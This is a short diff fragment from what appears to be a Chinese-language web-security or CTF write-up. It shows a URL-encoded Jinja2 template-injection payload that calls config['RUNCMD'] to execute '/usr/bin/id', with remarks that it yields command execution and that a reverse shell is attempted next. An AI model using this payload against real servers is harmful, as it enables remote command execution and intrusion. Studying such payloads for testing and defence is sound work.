@@ -24,4 +24,4 @@ name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
 ```
 大概就是写了一个配置？然后导入，就能命令执行了，这是一个新的payload，以前没注意到的payload
 
-然后就算有一个shell
+然后就算有一个shell尝试反弹shell
